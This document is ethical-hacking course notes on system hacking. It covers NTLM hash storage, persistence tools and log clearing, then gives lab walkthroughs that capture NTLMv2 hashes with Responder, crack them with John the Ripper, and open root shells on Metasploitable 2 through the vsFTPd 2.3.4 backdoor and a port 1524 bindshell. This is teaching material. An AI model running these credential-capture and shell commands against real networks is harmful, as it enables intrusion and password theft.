# System Hacking — Complete Notes

**Course:** Ethical Hacking / Cyber Security
**Type:** Theory + Practical Lab

> **Disclaimer:** All techniques here are strictly for **educational purposes** in an isolated lab environment. System hacking without **explicit written authorization** is illegal under **IT Act 2000, Section 66**. Always have proper authorization before implementing any technique.

---

## Table of Contents

1. [Prerequisites Before System Hacking](#1-prerequisites-before-system-hacking)
2. [Three Phases of System Hacking](#2-three-phases-of-system-hacking)
3. [Phase 1: Gaining Access — Three Methods](#3-phase-1-gaining-access--three-methods)
4. [Phase 2: Maintaining Access — Techniques](#4-phase-2-maintaining-access--techniques)
5. [Phase 3: Clearing Tracks (Covering Tracks)](#5-phase-3-clearing-tracks-covering-tracks)
6. [Windows Password Storage — How It Works](#6-windows-password-storage--how-it-works)
7. [Windows Event Viewer — Understanding Logs](#7-windows-event-viewer--understanding-logs)
8. [Practical 1: NTLM Hash Capture with Responder](#8-practical-1-ntlm-hash-capture-with-responder)
9. [Practical 2: Vulnerability-Based Exploitation (Metasploitable 2)](#9-practical-2-vulnerability-based-exploitation-metasploitable-2)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Prerequisites Before System Hacking

System hacking is **not a starting point** — it sits at the end of a sequential learning path. The following must be understood before attempting system hacking:

| Prerequisite                                                   | Why Needed                                                                                                                      |
| -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **Networking fundamentals**                                    | Understanding how systems communicate, IP addressing, protocols — without this, no attack can be planned or understood          |
| **Information gathering / Reconnaissance**                     | Knowing the target: its OS, services, open ports, versions — the attack is only as good as the intelligence gathered beforehand |
| **Network scanning**                                           | Identifying live hosts, open ports, running services — what you find here determines what you exploit                           |
| **Vulnerability analysis / One-bill (vulnerability) scanning** | Finding actual weaknesses in discovered services — these are the entry points                                                   |
| **Enumeration**                                                | Extracting detailed service/user/system information from a target                                                               |

> **Key principle:** You cannot hack what you don't understand. System hacking is the **application** of all previous knowledge, not an isolated skill.

---

## 2. Three Phases of System Hacking

Once reconnaissance, scanning, and vulnerability analysis are complete, system hacking follows three sequential phases:

```
[Reconnaissance] → [Network Scanning] → [Vulnerability Analysis]
                              ↓
                    SYSTEM HACKING BEGINS
                              ↓
            ┌─────────────────────────────────┐
            │  Phase 1: GAINING ACCESS        │
            │  (Password cracking,            │
            │   Privilege escalation,         │
            │   Vulnerability exploitation)   │
            └─────────────────────────────────┘
                              ↓
            ┌─────────────────────────────────┐
            │  Phase 2: MAINTAINING ACCESS    │
            │  (Backdoors, keyloggers,        │
            │   spyware, crackers)            │
            └─────────────────────────────────┘
                              ↓
            ┌─────────────────────────────────┐
            │  Phase 3: CLEARING TRACKS       │
            │  (Deleting logs, covering       │
            │   footprints)                   │
            └─────────────────────────────────┘
```

---

## 3. Phase 1: Gaining Access — Three Methods

### 3.1 Password Cracking

**Goal:** Obtain the actual password of a user account on the target system.

**How Windows stores passwords (essential background):**

1. When a user sets a password (e.g., `tooth4`), Windows does **not** store it as plaintext.
2. The password is run through a **hashing algorithm** — specifically **NTLM (NT LAN Manager)** — which converts it into a long hexadecimal string (e.g., `1zb9a69193z6b...`).
3. This **hash value** is stored in the **Security Account Manager (SAM)** file — located in the Windows system files.
4. The SAM file stores all user account password hashes, managed by the **Windows Domain Controller (DC)**.

**Login verification process:**

```
User types password → System hashes it using NTLM →
Hash is sent to Windows Domain Controller →
DC compares new hash with stored hash →
Match = access granted | No match = access denied
```

> **Why this matters for hacking:** The system **never compares the actual password** — it compares hashes. If an attacker can capture the hash, they don't need the password itself — they can either crack the hash or use it directly (pass-the-hash attack).

**Common attack against NTLM hashes:**

- **Dictionary attack** — try hashing every word in a word list and see if it matches the captured hash.
- **Brute force** — systematically try all possible combinations.
- **Rainbow table attack** — pre-computed hash tables for fast lookup.

---

### 3.2 Privilege Escalation

**Goal:** Move from a **limited/normal user** account to an **administrator/root** account.

**Analogy:**

- A company has employees (normal users) and the boss/owner (administrator).
- Normal users can work but cannot change passwords, install software, or access all areas.
- The administrator has full authority over the system.

**How it works in system hacking:**

1. Attacker gains initial access as a **normal user** (through network scanning, password cracking, or exploitation).
2. Using system vulnerabilities, the attacker **escalates their privileges** to gain administrator/root access.
3. Once at admin level, the attacker has full control of the system.

**Types:**

- **Horizontal privilege escalation** — moving from one normal user to another (accessing another user's data/files).
- **Vertical privilege escalation** — moving from a normal user to admin/root (gaining elevated permissions).

---

### 3.3 Vulnerability Exploitation (One-Bill Exploitation)

**Goal:** Scan the target for all vulnerabilities and exploit them to gain access — without necessarily targeting the password or user accounts directly.

**Difference from password cracking and privilege escalation:**
| Method | Focus |
|---|---|
| Password cracking | Specifically targets passwords/credentials |
| Privilege escalation | Specifically targets user account privilege levels |
| Vulnerability exploitation | Targets any/all technical weaknesses in services, software, OS, or configuration |

**How it works:**

1. During network scanning, all open ports and running services (with version numbers) are identified.
2. Each service's version is checked against known CVEs (Common Vulnerabilities and Exposures).
3. If a known exploit exists for that version, it is used to gain access.

**Important note:** These three methods are not mutually exclusive. Attackers try all available methods and pursue whichever succeeds. One vulnerability or one weak password is all that's needed.

---

## 4. Phase 2: Maintaining Access — Techniques

Once initial access is gained, the attacker must ensure they can return to the system even if:

- The victim restarts their computer.
- The network connection drops.
- The victim changes their password.

### 4.1 Backdoors

**What they are:** Malicious programs installed on the victim's system that run **silently in the background**, providing persistent remote access to the attacker.

- Run automatically at startup or at scheduled times.
- Hidden inside system folders or disguised as legitimate files.
- The victim has no visible indication the backdoor is running.

> **Digital forensics connection:** Backdoors are detectable through forensic investigation of log files, registry entries, and process analysis — which is why attackers also perform log clearing (Phase 3).

---

### 4.2 Password Crackers (Installed on Victim)

**What they do:** Programs installed on the victim's system that **automatically capture and crack new passwords** as the victim changes them — sending the cracked credentials back to the attacker.

- When the victim updates their password, the cracker intercepts the hash before it's stored.
- Cracks the hash and sends the plaintext password to the attacker.
- Ensures the attacker always has the current password, even after changes.

---

### 4.3 Keyloggers

**What they are:** Software or hardware that **records every keystroke** typed on the victim's keyboard — capturing passwords, messages, commands, and anything else typed.

**Two forms:**

| Type                   | Form                | How installed                                                  | Detection difficulty                                        |
| ---------------------- | ------------------- | -------------------------------------------------------------- | ----------------------------------------------------------- |
| **Software keylogger** | Program/application | Installed remotely via malware, exploit, or social engineering | Can be detected by AV software (but often evades basic AV)  |
| **Hardware keylogger** | Physical device     | Physically attached to the keyboard/USB port                   | Harder to detect via software; requires physical inspection |

**Types of keyloggers:**

| Type                            | Description                                                 |
| ------------------------------- | ----------------------------------------------------------- |
| **Standard software keylogger** | Application that logs keystrokes and stores/transmits them  |
| **WiFi keylogger**              | Transmits captured keystrokes over WiFi to attacker         |
| **Bluetooth keylogger**         | Transmits captured keystrokes via Bluetooth                 |
| **PS/2 keylogger**              | Hardware device inserted between PS/2 keyboard and computer |
| **Embedded keyboard keylogger** | Hardware component installed inside the keyboard itself     |
| **USB keylogger**               | Plugged into USB port between keyboard and computer         |

> **Why multiple types exist:** Different attack scenarios require different keylogger types. A remote attacker uses software; a physical attacker (insider threat) may use hardware that is undetectable by any software scan.

---

### 4.4 Spyware

**What it does:** Silently takes **screenshots or screen recordings** of the victim's system at regular intervals and sends them to the attacker's machine.

**How it works:**

1. Spyware is installed on the victim's system (via exploit, social engineering, or malware).
2. The spyware includes a **destination address** (the attacker's system or server).
3. It continuously captures screenshots and sends them to that destination.
4. The attacker receives a real-time visual feed of everything on the victim's screen.

**Platform coverage:** Spyware exists for Windows, macOS, and Linux — **no operating system is immune**.

**What spyware captures:** Login forms, documents, email content, banking pages, private communications, and any other screen content.

---

## 5. Phase 3: Clearing Tracks (Covering Tracks)

**Purpose:** Remove all evidence of the attacker's presence so forensic investigators cannot trace what was done, when, or by whom.

**Analogy:** Like walking on snow while brushing away your footprints as you go — leaving no visible trail.

### 5.1 What Are System Logs?

**Logs** are automatic records that every operating system maintains of all activity — like a security camera recording in text form:

- Which user logged in and when.
- Which user logged out and when.
- Which applications were opened.
- Which files and folders were accessed.
- When the system was powered on/off.
- Service starts and stops.
- Error events.
- Security events (failed login attempts, permission changes).

**Key fact:** Logs are recorded automatically — the user doesn't need to do anything. They happen in the background for security and diagnostic purposes.

### 5.2 Why Attackers Clear Logs

If logs are intact after an attack:

- Forensic investigators can read exactly which folders the attacker opened.
- They can trace the backdoor installation path.
- They can identify the timing and sequence of all malicious activities.
- They can potentially identify the attacker.

So attackers delete logs to prevent this investigation.

### 5.3 Windows Event Viewer — Log Types

To view logs on Windows: **Search → Event Viewer**

| Log Type             | Content                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------- |
| **Application Logs** | Which applications were opened/accessed, errors, crashes, login/logout records              |
| **Security Logs**    | User account management, authentication events, permission changes, security policy changes |
| **Setup Logs**       | Installation events, when configurations were changed                                       |
| **System Logs**      | Service starts/stops, driver events, system-level events controlled by Service Manager      |
| **Forwarded Events** | Events forwarded from other systems in the network                                          |

> **For forensic investigators:** Reading and interpreting these logs is a specialized skill. The log itself may seem cryptic, but trained digital forensics experts can reconstruct the entire sequence of events from them.

### 5.4 The Forensic Reality of Log Clearing

> **Important:** Even if an attacker deletes logs, **digital forensics can recover them**. Deleted data leaves traces that can be reconstructed by forensic experts. This is why covering tracks in digital forensics is never 100% successful — and why system hacking knowledge is directly relevant to forensic investigation.

---

## 6. Windows Password Storage — How It Works

_(Detailed technical breakdown for exam/interview preparation)_

| Step                      | What Happens                                                                                                              |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| **1. User sets password** | User creates a password (e.g., `tooth4`)                                                                                  |
| **2. Hashing**            | Windows runs the password through the **NTLM algorithm** — converts it to a hash value (e.g., `9e2a5f21b3cc19a72...`)     |
| **3. Storage**            | The hash is stored in the **SAM (Security Account Manager)** file — specifically within the **Windows Domain Controller** |
| **4. Login attempt**      | User types password → same NTLM algorithm converts it to a hash                                                           |
| **5. Comparison**         | Windows Domain Controller compares the new hash with the stored hash — it never compares the actual passwords             |
| **6. Result**             | If hashes match → access granted; if not → access denied                                                                  |

**Security Account Manager (SAM) file location:** `C:\Windows\System32\config\SAM`
_(This file is locked and cannot be accessed while Windows is running — special techniques are required to read it)_

**NTLM Hash characteristics:**

- Fixed length regardless of password length.
- Same input always produces the same output (deterministic).
- Designed to be one-way — you cannot reverse a hash to get the original password (theoretically).
- Weakness: **dictionary attacks and rainbow tables** work when the password is weak or common.

---

## 7. Windows Event Viewer — Understanding Logs

**How to access:** Press Windows Key → Search "Event Viewer" → Open

**Navigation:**

- **Windows Logs** section contains the core log types (Application, Security, Setup, System, Forwarded Events).
- Each log contains entries with: Event ID, Date/Time, Source, Level (Information/Warning/Error/Critical), and Description.

**Reading logs effectively:**

- Look at the **Event ID** — each event type has a unique ID (e.g., 4624 = successful login, 4625 = failed login).
- Check the **timestamp** — establishes a timeline.
- Look at the **Source** — identifies which service/application generated the event.
- Read the **Description** — provides specific details about what happened.

> A separate deep-dive video/resource is recommended for comprehensive log analysis, as reading logs is a complex skill requiring its own study.

---

## 8. Practical 1: NTLM Hash Capture with Responder

### 8.1 Tool Used

**Responder** — a network protocol poisoner that captures NTLM authentication hashes when a target device tries to access network resources.

### 8.2 Lab Setup

- **Attacker machine:** Parrot OS (or Kali Linux)
- **Target machine:** Windows machine on the same network
- **Requirement:** Both machines must be on the **same network** — this is mandatory; Responder only works on the local network segment

### 8.3 How Responder Works

Responder **poisons network name resolution protocols** (NBT-NS, LLMNR) — when a Windows machine tries to find a network resource and can't (e.g., a misspelled share name), it broadcasts a request. Responder intercepts this broadcast and responds, tricking the Windows machine into sending its NTLM authentication hash to the attacker.

### 8.4 Step-by-Step

**Step 1 — Navigate to the Responder folder:**

```bash
sudo su          # Gain root/administrator permission
[enter password]
ls               # Verify the responder folder is present
cd responder     # Enter the folder
ls               # List contents
```

**Step 2 — Check and set executable permission (if needed):**

```bash
chmod +x responder.py
# or: chmod +x [filename]
```

**Step 3 — Find your network interface:**

```bash
ifconfig         # Note your interface name (e.g., eth0)
```

**Step 4 — Launch Responder:**

```bash
./responder.py -I eth0
# Replace eth0 with your actual interface name
```

Responder is now **listening** — waiting for NTLM authentication requests from the network.

**Step 5 — Trigger authentication from target machine:**
On the Windows target machine, the victim logs in and accesses a network folder/resource. This triggers an authentication request that Responder intercepts.

**Step 6 — Capture the NTLM hash:**
When captured, the terminal shows the **NTLM hash** in **green text** — this is the encrypted password hash. Example output:

```
[SMB] NTLMv2-SSP Hash: ADMIN::WORKGROUP:hash_value...
```

**Step 7 — Locate saved hashes:**
Responder automatically saves captured hashes. Navigate to the logs directory:

```bash
cd /usr/share/responder/logs
ls               # Lists all saved hash files
cat [filename]   # View the captured hash
```

**Step 8 — Crack the hash with John the Ripper:**

```bash
john [path_to_hash_file]
# Example: john /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.10.10.x.txt
```

**Output when successful:**

```
user:password    (hash_value)
```

John the Ripper shows the username and the cracked plaintext password.

**Step 9 — Log in to the target machine:**
Use the discovered username and password to authenticate to the target Windows machine.

### 8.5 Important Limitations

- **Dictionary attack dependency:** John the Ripper's default dictionary attack only works if the password exists in the word list. Strong, unique passwords will not be cracked this way.
- **Network requirement:** You must be on the same local network as the target.
- **Authorization required:** Always perform this only on systems you own or have written authorization to test.

---

## 9. Practical 2: Vulnerability-Based Exploitation (Metasploitable 2)

### 9.1 Lab Setup

- **Attacker machine:** Kali Linux
- **Target machine:** Metasploitable 2 (deliberately vulnerable Linux VM)

### 9.2 Step 1 — Discover Target IP

```bash
netdiscover -i eth0 -r 10.10.10.0/24
```

_(Replace `eth0` with your network interface and adjust the IP range to match your subnet)_

**Output:** Lists all live hosts on the network with their IP addresses. In the lab:

- First IP = VMware network adapter (router)
- Second IP = VM server
- Third IP = **Target machine (Metasploitable 2)** — e.g., `10.10.10.4`

### 9.3 Step 2 — Network Scanning (Nmap)

```bash
nmap -vv -p- -sV -O 10.10.10.4
```

**Flag breakdown:**
| Flag | Meaning |
|---|---|
| `-vv` | Very verbose — show detailed output as scan progresses |
| `-p-` | Scan **all ports** (0–65535) |
| `-sV` | **Service version detection** — identify what software is running on each port |
| `-O` | **Operating system detection** |
| `10.10.10.4` | Target IP address |

**Key findings from the scan (Metasploitable 2 results):**

| Port          | Service   | Version          | Vulnerability                                           |
| ------------- | --------- | ---------------- | ------------------------------------------------------- |
| **21**        | FTP       | **vsFTPd 2.3.4** | Contains a backdoor — remote command execution possible |
| **1524**      | Bindshell | Metasploitable   | Direct root shell access via netcat                     |
| (many others) | Various   | Various          | ~30 services open, multiple exploitable                 |

### 9.4 Exploit 1 — vsFTPd 2.3.4 Backdoor

**Background:** vsFTPd 2.3.4 was distributed with a backdoor (intentionally or via supply chain compromise). Triggering the backdoor opens a root shell on port 6200.

**Step 1 — Find the exploit:**
Search on exploit databases (e.g., `exploit-db`) for `vsftpd 2.3.4`:

- Results show a **backdoor command execution** exploit script (Python).
- Download the exploit script.

**Step 2 — Give executable permission:**

```bash
chmod +x 49757.py
# (replace 49757.py with the actual filename of the downloaded exploit)
```

**Step 3 — Run the exploit:**

```bash
python3 49757.py 10.10.10.4
# (replace with your target IP)
```

**Successful output:**

```
[+] Success! Shell opened
$
```

A shell prompt appears — you now have access to the target machine.

**Step 4 — Verify access:**

```bash
whoami          # Shows: root
ifconfig        # Shows target machine's IP (confirms you're inside the target)
pwd             # Shows current directory: /root
ls              # Lists root directory files
```

**Step 5 — Demonstrate access (create a folder):**

```bash
mkdir hacker    # Create a new folder on the target
ls              # Verify it was created
```

Go to the target machine (Metasploitable) and verify the folder now exists there — confirming full system access.

---

### 9.5 Exploit 2 — Bindshell on Port 1524

**Background:** Port 1524 on Metasploitable 2 runs an intentional "ingreslock" backdoor that provides direct root shell access via Netcat.

**Command:**

```bash
nc 10.10.10.4 1524
```

**Successful output:**

```
root@metasploitable:/#
```

Immediately logged in as root — no credentials required.

**Verify:**

```bash
ifconfig        # Shows target machine's IP
pwd             # Shows /
ls              # Lists filesystem
```

**Create a folder and verify on both machines:**

```bash
mkdir new_version    # Create folder
ls                   # Confirm creation on attacker side
```

Check Metasploitable 2 directly → same folder is visible.

**Shutdown the target (demonstrates full control):**

```bash
shutdown -h now
# or: poweroff
```

The Metasploitable machine shuts down — the connection drops automatically. This demonstrates **complete system control**: the attacker can start/stop the target machine at will.

---

### 9.6 Key Observations from Practical 2

1. **Multiple entry points exist simultaneously** — Metasploitable 2 has ~30 open services, each potentially exploitable. In practice, attackers try multiple methods until one succeeds.

2. **Version numbers are critical** — knowing vsFTPd is version 2.3.4 (from Nmap) directly led to a working exploit. Without version detection, finding the exploit would be significantly harder.

3. **Some vulnerabilities give direct root access** — port 1524 (bindshell) gave root access with a single command and no credentials. This represents worst-case misconfiguration.

4. **The exploitation process is sequential:** Scan → Find vulnerable service → Find matching exploit → Configure → Execute → Verify access.

---

## 10. Key Takeaways

1. **System hacking requires all prior phases** — without solid reconnaissance, scanning, and vulnerability analysis, there is nothing to exploit. These phases are prerequisites, not optional preparation.

2. **Three phases of system hacking are sequential:** Gaining Access → Maintaining Access → Clearing Tracks. Each phase builds on the previous and has a specific set of techniques.

3. **Windows stores passwords as NTLM hashes, never as plaintext** — the SAM file in the Windows Domain Controller holds these hashes. Capturing and cracking hashes is the basis of Windows password attacks.

4. **Responder exploits Windows network authentication** — by responding to broadcast name resolution requests, it tricks Windows machines into revealing their NTLM hashes without any interaction from the victim beyond normal network activity.

5. **Version numbers from Nmap directly reveal exploits** — the vsFTPd 2.3.4 version number found in an Nmap scan led directly to a working exploit. This is why detailed service version scanning (`-sV`) is essential.

6. **Multiple vulnerabilities exist on most real systems** — Metasploitable 2 had ~30 exploitable services. Real-world targets typically have multiple vulnerabilities; attackers pursue the easiest path of least resistance.

7. **Logs record everything automatically** — every action on a Windows system is recorded in the Event Viewer. Attackers must clear these logs to avoid forensic detection, but digital forensics can often recover deleted logs.

8. **Maintaining access requires stealth** — backdoors, keyloggers, and spyware are designed to run invisibly. The more a tool blends with legitimate system processes, the longer access is maintained without detection.

9. **Keyloggers exist in both software and hardware form** — software keyloggers can be deployed remotely; hardware keyloggers require physical access but are undetectable by software scans.

10. **Practice only on authorized systems** — Metasploitable 2 exists specifically for legal, ethical practice. Never apply these techniques to real systems without written authorization.

---

_These notes complement the Metasploit Framework module (which covers exploitation using MSF Console) and the Digital Forensics modules (which cover recovery of evidence from compromised systems). System hacking and digital forensics are two sides of the same coin — understanding how attacks happen is essential for both performing and investigating them._
